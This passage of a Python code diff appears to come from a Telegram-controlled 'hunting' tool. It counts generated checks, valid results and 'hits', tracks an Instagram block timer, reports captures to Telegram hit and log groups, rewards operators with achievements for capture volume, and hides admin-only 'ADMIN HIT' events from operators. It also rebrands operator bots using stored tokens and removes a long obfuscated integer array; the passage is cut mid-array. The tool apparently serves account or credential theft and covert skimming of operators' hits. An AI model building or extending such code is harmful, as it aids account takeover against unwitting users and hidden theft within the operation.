+        (row.get("telegram_bot_token") or "").strip()
+        for row in devices
+        if (row.get("telegram_bot_token") or "").strip()
+    }
+    if not tokens:
+        return "No operator bots in database."
+    ok_count = 0
+    fail = []
+    for token in tokens:
+        success, msg = apply_operator_bot_branding(token)
+        if success:
+            ok_count += 1
+        else:
+            fail.append(msg[:40])
+    return f"Rebranded {ok_count}/{len(tokens)} bots." + (f" Fail: {fail[0]}" if fail else "")
+
+
+_tg_user_cache = {}
+_synced_operator_ids = set()
+
+
+def is_device_style_name(name):
+    if not name:
+        return True
+    return str(name).startswith("Op-") or str(name).startswith("Device")
+
+
+def _tg_user_cache_key(chat_id, api_url=None, member_group=None):
+    base = (api_url or TELEGRAM_API_URL or "none").rsplit("/", 1)[-1][:24]
+    if member_group:
+        return f"mem:{member_group}:{chat_id}:{base}"
+    return f"chat:{chat_id}:{base}"
+
+
+def _telegram_user_info_from_dict(data, chat_id):
+    first = (data.get("first_name") or "").strip()
+    last = (data.get("last_name") or "").strip()
+    username = (data.get("username") or "").strip()
+    full = " ".join(part for part in (first, last) if part).strip()
+    if not full and username:
+        full = f"@{username}"
+    if not full:
+        return None
+    return {"display_name": full, "username": username, "id": str(chat_id)}
+
+
+def _is_placeholder_user_label(name, user_id):
+    if not name:
+        return True
+    label = str(name).strip()
+    uid = str(user_id).strip()
+    if label in {f"User {uid}", f"User {uid[-6:]}", f"User {uid[-4:]}"}:
+        return True
+    return label.startswith("User ") and uid in label
+
+
+def fetch_telegram_user(chat_id, api_url=None):
+    chat_id = str(chat_id).strip()
+    if not chat_id:
+        return None
+    api = api_url or TELEGRAM_API_URL
+    if not api:
+        return None
+    cache_key = _tg_user_cache_key(chat_id, api)
+    if cache_key in _tg_user_cache:
+        return _tg_user_cache.get(cache_key)
+    try:
+        response = requests.get(
+            f"{api}/getChat",
+            params={"chat_id": chat_id},
+            timeout=8,
+        )
+        if not response.ok:
+            _tg_user_cache[cache_key] = None
+            return None
+        info = _telegram_user_info_from_dict(response.json().get("result") or {}, chat_id)
+        _tg_user_cache[cache_key] = info
+        return info
+    except Exception as exc:
+        log_event("TG USER", str(exc)[:80])
+        _tg_user_cache[cache_key] = None
+        return None
+
+
+def fetch_chat_member_profile(group_id, user_id, api_url=None):
+    group_id = str(group_id).strip()
+    user_id = str(user_id).strip()
+    api = api_url or TELEGRAM_API_URL
+    if not group_id or not user_id or not api:
+        return None
+    cache_key = _tg_user_cache_key(user_id, api, member_group=group_id)
+    if cache_key in _tg_user_cache:
+        return _tg_user_cache.get(cache_key)
+    try:
+        response = requests.get(
+            f"{api}/getChatMember",
+            params={"chat_id": group_id, "user_id": user_id},
+            timeout=8,
+        )
+        if not response.ok:
+            _tg_user_cache[cache_key] = None
+            return None
+        user = (response.json().get("result") or {}).get("user") or {}
+        info = _telegram_user_info_from_dict(user, user_id)
+        _tg_user_cache[cache_key] = info
+        return info
+    except Exception as exc:
+        log_event("TG USER", str(exc)[:80])
+        _tg_user_cache[cache_key] = None
+        return None
+
+
+def _telegram_lookup_api_urls():
+    urls = []
+    token = (_admin_settings.get("admin_bot_token") or "").strip()
+    if token:
+        urls.append(f"https://api.telegram.org/bot{token}")
+    if TELEGRAM_API_URL and TELEGRAM_API_URL not in urls:
+        urls.append(TELEGRAM_API_URL)
+    return urls
+
+
+def lookup_telegram_user_display(user_id):
+    """Name/username via operator bot, admin bot, or staff group membership."""
+    user_id = str(user_id).strip()
+    if not user_id:
+        return None
+    for api in _telegram_lookup_api_urls():
+        info = fetch_telegram_user(user_id, api_url=api)
+        if info and not _is_placeholder_user_label(info.get("display_name"), user_id):
+            return info
+    for api in _telegram_lookup_api_urls():
+        for group_id in (
+            _admin_settings.get("logs_group_id"),
+            _admin_settings.get("hits_group_id"),
+        ):
+            if group_id:
+                info = fetch_chat_member_profile(group_id, user_id, api_url=api)
+                if info and not _is_placeholder_user_label(info.get("display_name"), user_id):
+                    return info
+    return None
+
+
+def resolve_support_contact_html():
+    admin_load_settings()
+    admin_ids = [str(a) for a in _admin_settings.get("admin_ids", []) if a]
+    if not admin_ids:
+        return "<i>admin not set</i>"
+    uid = admin_ids[0]
+    info = lookup_telegram_user_display(uid)
+    if info:
+        return telegram_profile_link_html(uid, user_info=info)
+    return admin_channel_tag()
+
+
+def telegram_profile_link_html(chat_id, fallback_name=None, user_info=None):
+    chat_id = str(chat_id).strip()
+    info = user_info
+    if not info:
+        info = fetch_telegram_user(chat_id)
+    if not info and chat_id.lstrip("-").isdigit():
+        info = lookup_telegram_user_display(chat_id)
+    if info:
+        label = html.escape(info["display_name"])
+        if info.get("username"):
+            href = f"https://t.me/{info['username']}"
+        else:
+            href = f"tg://user?id={chat_id}"
+    else:
+        stored = fallback_name if fallback_name and not is_device_style_name(fallback_name) else None
+        label = html.escape(stored or "Support")
+        href = f"tg://user?id={chat_id}"
+    return f'<a href="{href}">{label}</a>'
+
+
+def sync_operator_name_from_telegram(operator_id):
+    if not operator_id or not is_cloud_enabled():
+        return
+    info = fetch_telegram_user(operator_id)
+    if not info:
+        return
+    profile, err = fetch_profile(operator_id)
+    if err:
+        return
+    if not profile:
+        profile = default_profile()
+        profile["operator_id"] = str(operator_id)
+    profile["display_name"] = info["display_name"]
+    upsert_profile(profile)
+
+
+def schedule_operator_name_sync(operator_id):
+    op_id = str(operator_id or "").strip()
+    if not op_id or op_id in _synced_operator_ids:
+        return
+    _synced_operator_ids.add(op_id)
+    threading.Thread(
+        target=sync_operator_name_from_telegram,
+        args=(op_id,),
+        daemon=True,
+    ).start()
+
+
+def _sync_operator_display_name(display_name):
+    if not is_device_ready():
+        return
+    oid = resolve_operator_id(TELEGRAM_CHAT_ID)
+    info = fetch_telegram_user(oid)
+    resolved = (info or {}).get("display_name") if info else display_name
+    if not resolved or is_device_style_name(resolved):
+        resolved = display_name
+    if not resolved:
+        return
+    profile = default_profile()
+    profile["display_name"] = resolved
+    upsert_profile(profile)
+
+
+LAST_UPDATE_ID = 0
+paused = False
+_user_manual_paused = False
+_api_auto_paused = False
+_api_last_hunt_ok_at = 0.0
+_api_pause_log_at = 0.0
+pause_event = threading.Event()
+pause_event.clear()
+_pause_state_guard = threading.Lock()
+_pause_state_updating = False
+BOT_POLL_INTERVAL = 2
+TG_POLL_HTTP_TIMEOUT = 28
+TG_SEND_TIMEOUT = 24 if _IS_TERMUX else 16
+TG_HIT_MAX_RETRIES = 12 if _IS_TERMUX else 10
+TG_HIT_EDIT_MAX_RETRIES = 6
+TG_HIT_RETRY_BASE_SEC = 2.0
+HIT_TG_MIN_INTERVAL_SEC = 1.15 if _IS_TERMUX else 0.35
+HIT_TG_RETRY_MAX = 20
+_hit_tg_last_send_mono = 0.0
+_hit_tg_send_lock = threading.Lock()
+_hit_tg_retry_pending = []
+_hit_tg_retry_lock = threading.Lock()
+_hit_tg_retry_started = False
+_hit_tg_msg_cache = {}
+_hit_tg_user_locks = {}
+_hit_tg_user_locks_guard = threading.Lock()
+_hit_tg_msg_lock = threading.Lock()
+HIT_TG_MSG_CACHE_TTL = 3600
+ERROR_LOG_PATH = "log.txt"
+_log_file_lock = threading.Lock()
+API_TOOL_TIMEOUT = 14
+COLOR_SUPPORT = sys.stdout.isatty()
+ANSI_RESET = "\033[0m"
+ANSI_CYAN = "\033[96m"
+ANSI_GREEN = "\033[92m"
+ANSI_YELLOW = "\033[93m"
+ANSI_RED = "\033[91m"
+ANSI_DIM = "\033[2m"
+ANSI_MAGENTA = "\033[95m"
+ANSI_BLUE = "\033[94m"
+
+gen = 0
+valid = 0
+hit = 0
+errors = 0
+START_TIME = datetime.now(timezone.utc)
+_last_gen_at = time.monotonic()
+_pulse_last_gen = 0
+_pulse_last_at = time.monotonic()
+_hunt_gateway_meta = {"buffer": None, "ig_block": 0.0, "ig_block_at": 0.0, "updated": 0.0}
+_hunt_inflight = 0
+_hunt_inflight_lock = threading.Lock()
+_hunt_pulse_started = False
+event_log = []
+event_log_lock = threading.Lock()
+MAX_EVENTS = 6
+_OPERATOR_HIDDEN_LOG_TYPES = frozenset({"ADMIN HIT", "ADMIN"})
+
+
+def _operator_log_event_visible(event_type):
+    """Admin-internal events never appear in operator panel or TG live feed."""
+    et = (event_type or "").strip().upper()
+    if et in _OPERATOR_HIDDEN_LOG_TYPES:
+        return False
+    return not (et.startswith("ADMIN ") or et.startswith("ADMIN."))
+
+
+def _operator_log_entry_visible(entry):
+    text = str(entry).upper()
+    return "] ADMIN" not in text
+
+
+def _operator_visible_events(events):
+    return [e for e in events if _operator_log_entry_visible(e)]
+
+LIVE_WATCH = False
+LIVE_PANEL = {"chat_id": None, "message_id": None, "view": None}
+CMD_REPLY_PANEL = {"chat_id": None, "message_id": None, "is_photo": False}
+STARTUP_PANEL = {"chat_id": None, "message_id": None, "has_photo": False}
+_startup_loading_discard = {}
+_startup_loading_lock = threading.Lock()
+_startup_photo_cache = {"bytes": None, "ctype": None, "at": 0.0}
+_branding_schedule_keys = set()
+LIVE_WATCH_INTERVAL = 5
+LIVE_DASHBOARD_CALLBACKS = frozenset({"STATS", "PAUSE", "RESUME", "LIVE_ON"})
+HIT_MILESTONES = (250, 500, 1000, 2500, 5000, 10000)
+last_milestone_hit = 0
+
+LEADERBOARD_MODE = "operators"
+
+ACHIEVEMENTS = {
+    "first_hit": ("First Blood", "First capture logged", "◈"),
+    "hits_10": ("Apex Hunter", "250 lifetime hits", "▣▣"),
+    "hits_50": ("Warlord", "1,000 lifetime hits", "◆◆"),
+    "hits_100": ("Mythic", "5,000 lifetime hits", "★★"),
+    "session_10": ("Inferno Run", "75 hits in one session", "▰▰"),
+    "session_25": ("Annihilation", "150 hits in one session", "▰▰▰"),
+    "speed_20": ("Velocity", "50 hits within 60 minutes", "↻↻"),
+    "gen_1k": ("Overclock", "25,000 checks in one session", "⊕⊕"),
+    "clean_5": ("Flawless Op", "25 hits, zero errors in one session", "◎◎"),
+    "streak_3": ("Iron Will", "14-day active streak", "‖‖"),
+    "streak_7": ("Relentless", "30-day active streak", "‖‖‖"),
+    "quality_3": ("Bronze Standard", "75× 3★+ quality hits lifetime", "☆☆☆"),
+    "quality_4": ("Silver Standard", "40× 4★+ quality hits lifetime", "☆☆☆☆"),
+    "quality_5": ("Perfect Hit", "15× 5★ quality hits lifetime", "☆☆☆☆☆"),
+    "quality_5_x5": ("Elite Quality", "50× 5★ quality hits lifetime", "★★★★★"),
+    "quality_5_x10": ("Transcendent", "150× 5★ quality hits lifetime", "◈◈"),
+}
+
+profile_lock = threading.Lock()
+_session_hit_times = []
+SESSION_HIT_WINDOW_SEC = 3600
+
+lock = threading.Lock()
+worker_threads = []
+_worker_last_access_sync = 0.0
+_workers_started = False
+
+session = requests.Session()
+retry_strategy = Retry(
+    total=RETRY_TOTAL,
+    backoff_factor=0.5,
+    status_forcelist=[429, 500, 502, 503, 504],
+    allowed_methods=["GET", "POST"],
 )
-_7f2d14173c = (1321, 614, 757, 1232, 33, 1731, 2956, 2088, 1914, 3025, 1391, 1968, 3508, 198, 953, 3035, 1852, 2441, 891, 2507, 2012, 944, 602, 2112, 3377, 2149, 2443, 3640, 3290, 2892, 1354, 2491, 2948, 2297, 323, 3103, 805, 1292, 598, 35, 823, 3329, 802, 1620, 1472, 241, 972, 1343, 2870, 3652, 3115, 2049, 1949, 3596, 957, 766, 3348, 95, 3234, 556, 3610, 2871, 3420, 1688, 2779, 836, 510, 2015, 2736, 1441, 3144, 2463, 737, 814, 3077, 1534, 490, 3440, 3681, 3446, 2749, 2313, 2278, 2300, 3321, 3671, 2754, 2267, 3279, 714, 3173, 1873, 1256, 2238, 2358, 1208, 3659, 362, 541, 3133, 516, 1624, 1897, 1171, 1154, 2961, 2179, 905, 2422, 3536, 3678, 2604, 2550, 3015, 609, 390, 2122, 374, 694, 2841, 1075, 3159, 3289, 657, 2878, 2279, 1348, 2965, 1153, 1076, 1092, 2760, 727, 50, 3303, 2739, 3702, 307, 331, 2661, 1106, 0, 560, 1800, 1187, 3095, 816, 797, 278, 584, 2980, 747, 3226, 2656, 2997, 2398, 2724, 1058, 2433, 3064, 1135, 1269, 721, 1191, 590, 412, 3029, 2897, 2204, 2489, 672, 2349, 3558, 1169, 1204, 1459, 1425, 3282, 1344, 121, 919, 1670, 907, 2525, 1194, 182, 753, 400, 1252, 1337, 1726, 1878, 1015, 2992, 2128, 3456, 771, 3401, 3613, 3593, 3327, 3514, 318, 92, 865, 2563, 3266, 2939, 1334, 3021, 3481, 3332, 456, 2462, 2869, 1787, 3548, 2609, 2338, 3430, 1929, 1861, 3156, 739, 3522, 68, 2738, 2456, 1542, 3196, 3701, 1684, 2199, 2182, 2774, 3614, 2703, 1586, 1601, 2846, 1227, 2737, 1408, 2079, 2490, 3193, 3227, 244, 922, 2906, 2975, 194, 3654, 427, 3465, 625, 34, 2721, 3258, 268, 1152, 1065, 3323, 983, 2951, 1349, 150, 3047, 1333, 1420, 1757, 3066, 1356, 3356, 1806, 3088, 3682, 2932, 1157, 2085, 2696, 319, 2276, 929, 3379, 3381, 1833, 3597, 336, 2784, 260, 2345, 3181, 1705, 2990, 3310, 915, 3685, 2330, 2968, 1462, 1502, 2373, 2046, 854, 84, 843, 975, 3138, 605, 1093, 99, 286, 676, 2627, 1345, 1895, 1847, 1170, 2249, 2207, 3094, 3368, 2984, 3313, 2729, 1617, 1004, 579, 1595, 3043, 3037, 3125, 1882, 2166, 388, 1358, 2677, 557, 3109, 871, 3676, 32, 2707, 2447, 1985, 1560, 145, 2800, 2040, 2782, 215, 3529, 1815, 2253, 708, 1110, 1500, 3569, 1351, 1606, 3319, 356, 418, 2061, 550, 2762, 146, 404, 696, 3550, 2874, 3633, 2687, 428, 1911, 2622, 903, 2967, 1904, 40, 1798, 453, 1340, 2141, 3349, 2775, 2716, 1728, 1538, 1738, 558, 1492, 2704, 161, 738, 1994, 544, 46, 2285, 2766, 2903, 1216, 1912, 1797, 2377, 293, 107, 303, 526, 1125, 2935, 2767, 2269, 1605, 1377, 1287, 3542, 1175, 916, 2837, 1677, 1510, 2109, 523, 1077, 2328, 1692, 3288, 1769, 41, 3489, 2955, 2849, 634, 288, 1611, 3211, 1474, 992, 1423, 1550, 2068, 18, 1399, 168, 2772, 337, 513, 3213, 3070, 3439, 1083, 2350, 1830, 2380, 2786, 2867, 752, 3346, 205, 1052, 1215, 872, 284, 2217, 6, 348, 1927, 109, 3160, 2843, 3632, 3696, 1803, 719, 1545, 2631, 942, 620, 436, 67, 2798, 1691, 580, 1005, 689, 195, 2414, 1678, 1365, 2850, 2866, 3398, 2922, 66, 1096, 2765, 2058, 847, 3396, 3164, 2227, 1760, 2709, 1863, 2488, 810, 466, 2025, 1315, 486, 874, 3096, 3170, 768, 1574, 1261, 568, 3352, 2434, 155, 3238, 1193, 750, 1765, 3653, 2127, 156, 1999, 419, 1273, 2275, 1380, 877, 458, 2885, 2576, 906, 2560, 3657, 309, 2572, 1064, 1155, 761, 2228, 663, 2513, 952, 494, 519, 1426, 2690, 2144, 2797, 3589, 3606, 2663, 1291, 7, 1505, 3046, 586, 410, 835, 364, 179, 3334, 391, 91, 1032, 925, 2505, 746, 3044, 1415, 2872, 1565, 3113, 1739, 2826, 3668, 56, 3598, 3187, 782, 190, 555, 424, 3490, 1162, 335, 247, 1457, 2783, 2808, 2501, 790, 2460, 547, 964, 680, 2556, 615, 3342, 1716, 3026, 2028, 1258, 2244, 42, 1137, 1645, 1302, 1335, 596, 1627, 2180, 3317, 350, 73, 3546, 2855, 2693, 3660, 3457, 200, 343, 3584, 2715, 2230, 2408, 3067, 3054, 2319, 1855, 2502, 347, 1596, 911, 2282, 1414, 3382, 2708, 133, 300, 2063, 2363, 1231, 3039, 2625, 136, 2052, 1196, 314, 3336, 216, 2131, 3114, 3626, 699, 3686, 3019, 904, 2437, 1485, 1712, 180, 3076, 332, 517, 2601, 2653, 1206, 1200, 2917, 2795, 1704, 493, 1616, 2323, 1683, 1553, 1021, 359, 1870, 1290, 1475, 991, 3033, 1056, 898, 88, 2921, 1140, 3563, 1587, 113, 2302, 2240, 443, 1975, 1084, 3675, 637, 710, 980, 1219, 377, 3552, 2034, 471, 3318, 1643, 531, 2222, 3464, 1568, 2573, 2461, 3222, 2506, 687, 2881, 1983, 2963, 2471, 45, 2001, 452, 3397, 3251, 2742, 1234, 3051, 339, 3553, 846, 3299, 1413, 2193, 1991, 2824, 974, 3023, 3419, 794, 3448, 2991, 593, 3137, 892, 491, 1626, 940, 3169, 685, 2248, 2864, 1120, 57, 1205, 1300, 140, 3000, 3297, 1008, 54, 430, 718, 2266, 55, 1881, 3643, 2645, 409, 16, 963, 1000, 2565, 1817, 3119, 2336, 1034, 3275, 3361, 14, 2683, 3230, 3431, 123, 3271, 3504, 1374, 1933, 3208, 1654, 1240, 1197, 172, 1275, 612, 2527, 3221, 514, 1468, 791, 3525, 279, 1022, 1174, 988, 465, 152, 2974, 1763, 1282, 1893, 1794, 2566, 3276, 2466, 2010, 3447, 2101, 532, 1370, 1648, 2856, 1974, 3308, 3127, 153, 1211, 1429, 3098, 255, 2793, 3428, 2552, 848, 2495, 1686, 1512, 552, 2162, 2493, 2861, 819, 1782, 3466, 784, 174, 127, 539, 294, 3421, 250, 305, 358, 12, 3506, 304, 1762, 1775, 2427, 1816, 2619, 2757, 703, 997, 857, 2075, 1323, 1382, 2110, 3422, 3703, 392, 1866, 2115, 1585, 2930, 2364, 3110, 2599, 2635, 2316, 1455, 1386, 1540, 2857, 660, 1362, 248, 1702, 214, 2405, 1456, 2416, 1481, 832, 2353, 1122, 1737, 3197, 1915, 2706, 2381, 3357, 2950, 2023, 1406, 3360, 313, 507, 2246, 1541, 1522, 2578, 2684, 1067, 1821, 1336, 3477, 3091, 3664, 538, 2354, 645, 2629, 3647, 1582, 3383, 329, 1995, 548, 2011, 3656, 677, 1172, 43, 1791, 1767, 926, 2206, 3690, 2428, 2368, 408, 2575, 2103, 2580, 1865, 3154, 2147, 518, 1687, 2268, 808, 173, 1068, 2676, 13, 2617, 785, 1876, 1707, 128, 582, 1871, 2812, 1319, 455, 3644, 638, 1497, 2043, 736, 1557, 643, 333, 629, 2596, 2476, 429, 570, 1875, 1494, 47, 2809, 415, 2557, 2274, 1063, 2223, 3050, 1124, 3010, 1182, 3391, 1862, 3590, 1597, 2331, 1748, 3049, 2356, 3123, 967, 2284, 2151, 2185, 357, 1656, 655, 398, 985, 1854, 2281, 3186, 2218, 1671, 39, 979, 2083, 1454, 2644, 2035, 958, 2298, 1324, 3233, 3619, 3016, 976, 1355, 188, 2177, 502, 160, 961, 2685, 2995, 1448, 543, 1214, 1766, 2682, 3143, 2389, 1723, 2452, 3078, 2636, 3097, 3663, 1203, 793, 674, 1036, 165, 3100, 3482, 239, 1381, 2712, 1490, 230, 1409, 3220, 1180, 3518, 3201, 3473, 3452, 2748, 1112, 692, 2021, 1808, 1183, 2388, 275, 1109, 3353, 1384, 1607, 1513, 2020, 3355, 3153, 900, 3538, 3124, 651, 2543, 968, 2672, 1241, 2862, 936, 1570, 2787, 943, 3426, 3185, 3588, 3188, 3183, 1531, 1020, 1259, 1132, 820, 1576, 2418, 2064, 1164, 2818, 1230, 2692, 420, 654, 1986, 2277, 564, 1286, 446, 1885, 1069, 3280, 2949, 2250, 2235, 2375, 1163, 2890, 671, 3134, 2470, 2821, 1014, 2537, 1289, 1330, 1433, 1264, 3053, 2256, 2983, 959, 787, 662, 1272, 3483, 30, 1559, 2568, 3372, 497, 444, 3480, 2157, 2516, 2923, 3680, 1831, 8, 1466, 3270, 973, 2415, 2073, 1209, 1635, 2439, 1308, 310, 1581, 2613, 2958, 2768, 3, 460, 2718, 3307, 1659, 1184, 1910, 1037, 3215, 1993, 1265, 3343, 1788, 2311, 2561, 3404, 2214, 3438, 2529, 3625, 2080, 25, 1578, 1804, 2145, 3601, 87, 524, 1035, 2016, 1435, 2351, 2600, 2205, 930, 3122, 704, 2539, 764, 2920, 2526, 296, 2286, 2379, 3638, 3139, 53, 798, 411, 2680, 1516, 2877, 3600, 2827, 2504, 1805, 2838, 2934, 3302, 546, 3262, 2243, 229, 1552, 3273, 311, 999, 623, 1228, 1637, 2465, 622, 882, 1703, 2442, 2078, 1009, 2146, 139, 2947, 3615, 1352, 1795, 2233, 735, 1930, 866, 1372, 1479, 762, 175, 726, 3102, 1053, 1464, 1048, 1638, 1588, 1044, 2071, 274, 1848, 2776, 1449, 1070, 759, 485, 1772, 2569, 2551, 2988, 270, 2927, 3616, 132, 1185, 1389, 3359, 754, 1266, 149, 1484, 3306, 1720, 3176, 1317, 2295, 1580, 1651, 695, 849, 2174, 2026, 276, 1717, 2225, 63, 261, 334, 3545, 1388, 2726, 171, 864, 860, 251, 225, 3223, 2050, 2624, 1046, 3157, 3693, 2100, 2446, 2400, 191, 3442, 2237, 2473, 1602, 3533, 1600, 817, 1976, 1469, 955, 1024, 2087, 3269, 426, 873, 1809, 1253, 106, 3085, 3003, 661, 1901, 711, 3539, 619, 2430, 3291, 733, 3521, 2770, 841, 2918, 1486, 2339, 2188, 1548, 1573, 31, 98, 3059, 3560, 3121, 3224, 1928, 312, 856, 1173, 616, 3500, 212, 613, 416, 2937, 2698, 1145, 2469, 664, 111, 1161, 1312, 3284, 1328, 1314, 1988, 1826, 1326, 3641, 58, 9, 932, 2603, 1658, 751, 3648, 363, 3499, 3239, 1074, 365, 1167, 3198, 381, 2998, 2816, 3530, 2614, 1967, 1820, 2790, 3261, 351, 2904, 475, 3149, 3476, 1842, 1521, 1341, 3166, 2496, 1609, 1965, 267, 1011, 204, 3637, 237, 697, 1610, 3146, 213, 2132, 1440, 1116, 2161, 656, 476, 2135, 3576, 2, 914, 2183, 2344, 1095, 3071, 1400, 1016, 3453, 3316, 3445, 438, 2475, 103, 2588, 2200, 3437, 1085, 94, 467, 2577, 1278, 11, 1047, 1891, 3118, 3117, 1244, 3706, 394, 885, 2360, 3041, 1811, 1190, 2547, 2346, 2394, 406, 396, 833, 2873, 3328, 1201, 2807, 644, 742, 2931, 2450, 2481, 2126, 2909, 1649, 495, 859, 1280, 2511, 1262, 869, 2017, 3516, 1836, 826, 1156, 2626, 1598, 1498, 2153, 1567, 1944, 610, 3393, 3432, 1529, 1049, 978, 3503, 2154, 3305, 69, 3587, 227, 3695, 1990, 2750, 89, 1749, 108, 2403, 211, 1471, 1887, 3009, 2608, 1111, 804, 995, 2229, 574, 246, 104, 1615, 368, 1661, 479, 2420, 1239, 1027, 349, 3148, 601, 5, 2865, 3175, 1001, 1709, 1101, 567, 2261, 27, 2498, 2806, 3543, 2220, 488, 3389, 1625, 2245, 1689, 1859, 2423, 234, 23, 2659, 1268, 228, 1807, 2367, 1517, 258, 1133, 1633, 3523, 2669, 883, 2938, 1681, 1890, 1730, 1711, 3705, 3603, 38, 935, 2426, 1956, 2778, 2116, 3519, 1755, 2503, 2053, 2651, 1030, 731, 2834, 585, 2477, 3485, 2882, 306, 2168, 2059, 3311, 3365, 2485, 2192, 1401, 2288, 648, 1251, 796, 1086, 259, 3163, 126, 1509, 1551, 2164, 845, 2836, 3167, 2536, 3205, 3507, 2306, 2384, 2916, 3498, 2271, 1147, 417, 780, 2314, 3484, 899, 1443, 3005, 948, 588, 64, 378, 3691, 193, 3408, 642, 3027, 1931, 3219, 2982, 2448, 633, 1632, 3018, 571, 1412, 2055, 2419, 3298, 301, 474, 3351, 1499, 2512, 120, 254, 2558, 3635, 90, 2681, 3082, 3063, 1590, 1225, 1028, 285, 2615, 621, 3667, 207, 1946, 3467, 3304, 3256, 2518, 577, 933, 3534, 399, 2700, 3475, 435, 1608, 341, 2519, 3441, 506, 1959, 3017, 939, 2621, 282, 3292, 2620, 769, 611, 1575, 297, 3556, 1888, 2819, 1660, 3135, 238, 2559, 1696, 2265, 966, 1026, 233, 2480, 2458, 425, 1750, 2590, 1159, 2386, 157, 292, 2785, 3255, 2047, 2986, 525, 1283, 2159, 432, 379, 1189, 3683, 1491, 1562, 70, 3651, 776, 1463, 741, 291, 2769, 760, 2673, 3555, 222, 1902, 3028, 437, 1311, 783, 3496, 1072, 3217, 3577, 938, 2453, 2987, 3469, 1436, 2744, 569, 433, 3370, 2638, 2048, 265, 1461, 3461, 478, 2150, 681, 1685, 1100, 2236, 2664, 2337, 2926, 888, 2694, 2780, 1846, 2665, 218, 3285, 2347, 1935, 3272, 17, 2044, 3492, 1434, 1387, 3471, 3528, 827, 1822, 20, 76, 2371, 2660, 1680, 385, 2500, 801, 2241, 1217, 2553, 2006, 799, 2845, 3451, 1785, 3158, 2610, 434, 2725, 2522, 954, 825, 3450, 2299, 3001, 3335, 1186, 2077, 2221, 1619, 2242, 3388, 3248, 3080, 1229, 3551, 1419, 1530, 3129, 3472, 3231, 3443, 1650, 116, 1832, 235, 2863, 937, 2593, 542, 1569, 3014, 1549, 977, 2000, 1099, 2094, 722, 3232, 154, 1421, 3007, 3268, 3517, 1088, 812, 1998, 994, 266, 2879, 3669, 779, 668, 2027, 512, 3579, 3620, 1641, 2308, 2348, 1006, 3074, 1139, 3434, 691, 879, 1263, 2859, 1701, 2038, 3547, 2755, 1102, 1255, 1342, 1379, 2541, 1520, 894, 599, 743, 1285, 880, 2925, 716, 1025, 3202, 1913, 262, 2933, 2605, 372, 2756, 1629, 562, 3130, 281, 203, 3544, 3524, 679, 1773, 221, 1735, 2840, 26, 2410, 3247, 373, 831, 1977, 1652, 1394, 2801, 2333, 3565, 1674, 1226, 2900, 3594, 2203, 934, 908, 118, 1322, 3631, 413, 3384, 682, 2792, 3362, 3413, 2670, 2970, 1438, 2255, 2647, 3564, 1845, 1614, 421, 3058, 755, 834, 2098, 986, 3698, 1480, 383, 2952, 3568, 2994, 187, 3031, 3079, 1972, 3200, 496, 3618, 2686, 232, 360, 82, 186, 1296, 2907, 2628, 2309, 2451, 2728, 3199, 1128, 2355, 184, 2424, 824, 2830, 3011, 3661, 2637, 3145, 3494, 3337, 3178, 1148, 315, 632, 604, 2357, 1879, 1284, 3665, 3559, 2018, 3177, 2745, 800, 1119, 2472, 1741, 2474, 3572, 890, 592, 998, 1992, 1592, 3454, 2069, 2374, 1254, 3081, 982, 2592, 2658, 2679, 2074, 1916, 1837, 97, 2440, 220, 3573, 2944, 3344, 1939, 1682, 3057, 80, 271, 545, 2960, 2954, 3591, 3630, 3203, 2521, 1357, 24, 376, 1734, 1898, 2175, 3658, 1515, 1237, 316, 501, 2671, 2139, 2562, 1177, 2113, 131, 895, 2270, 1115, 164, 1693, 786, 3245, 1478, 352, 3373, 1514, 208, 3092, 595, 1724, 1828, 366, 483, 1404, 1960, 2324, 2361, 3662, 1984, 1829, 535, 2973, 807, 821, 2499, 2657, 256, 2090, 110, 353, 3541, 3415, 3677, 1418, 2891, 675, 2751, 3324, 1061, 1313, 2799, 1277, 2546, 361, 1729, 1971, 1446, 2272, 1390, 2764, 1445, 763, 2945, 1789, 2880, 2343, 2860, 1827, 2111, 178, 2794, 2586, 3108, 1248, 130, 1790, 2833, 2595, 81, 473, 1733, 1375, 2304, 2438, 1858, 1969, 928, 1396, 631, 3090, 158, 1973, 3325, 652, 3513, 1758, 3581, 2898, 2594, 2691, 1316, 3107, 1732, 2531, 1941, 1840, 1368, 858, 1188, 1599, 540, 1563, 533, 2893, 3229, 2342, 209, 1952, 1982, 1431, 1123, 1298, 1753, 2585, 3580, 369, 2781, 2191, 2091, 36, 1071, 3004, 3468, 1207, 2045, 1042, 3210, 2753, 950, 1081, 1, 74, 1539, 3036, 828, 701, 197, 1825, 3586, 10, 3120, 2732, 2548, 2555, 2796, 2215, 1695, 3699, 1978, 1039, 386, 326, 626, 887, 3192, 1424, 2251, 3367, 536, 2723, 2468, 124, 1943, 1179, 1669, 924, 3105, 1483, 1045, 1080, 1353, 439, 2457, 2029, 2099, 553, 666, 2940, 3055, 2828, 2483, 2036, 3287, 15, 96, 1940, 2326, 2678, 2817, 1523, 1877, 2584, 781, 3515, 447, 280, 2905, 308, 1127, 705, 3554, 700, 3087, 1134, 2436, 2730, 1740, 1288, 1160, 3479, 2107, 243, 2198, 3704, 83, 1987, 2761, 3191, 2341, 2844, 2224, 639, 931, 1818, 3006, 2002, 2674, 2714, 725, 1867, 183, 2287, 1955, 2209, 2545, 1920, 2540, 962, 441, 2170, 3093, 1503, 1325, 1719, 328, 2134, 3639, 3236, 2587, 1979, 1149, 1743, 21, 2425, 3048, 3399, 749, 1554, 1963, 3509, 2392, 401, 2538, 1094, 1906, 3207, 2301, 1202, 176, 3363, 1018, 2720, 2210, 1947, 2031, 534, 2646, 3300, 1518, 2370, 1699, 1628, 2296, 402, 996, 477, 803, 2004, 2777, 1108, 3240, 3259, 1136, 2445, 102, 3086, 273, 2717, 112, 2097, 1007, 1476, 2263, 3636, 1761, 142, 3326, 1168, 2928, 3387, 2160, 1427, 1948, 573, 2208, 1546, 1537, 163, 3136, 1131, 862, 2666, 745, 2655, 3286, 2019, 2320, 969, 946, 1359, 1714, 1087, 608, 3520, 2435, 1801, 79, 167, 3264, 649, 2362, 1780, 707, 777, 72, 2307, 3089, 1332, 1744, 2060, 2532, 1799, 617, 1980, 565, 2542, 851, 618, 2176, 815, 2484, 2397, 2642, 2908, 272, 3406, 185, 2407, 698, 2773, 1043, 1747, 2524, 1909, 1126, 1257, 913, 2232, 3040, 1465, 1783, 3142, 1089, 2910, 169, 393, 1644, 324, 217, 2231, 1320, 788, 2332, 100, 1301, 3126, 2359, 1199, 1222, 3364, 382, 1886, 896, 1896, 3478, 325, 870, 1107, 1246, 3402, 370, 1250, 253, 3435, 1819, 2417, 563, 3294, 2305, 3692, 1996, 1700, 1117, 1618, 269, 135, 1667, 1143, 2366, 1725, 1295, 189, 635, 2383, 3395, 1142, 2889, 459, 3425, 3621, 1528, 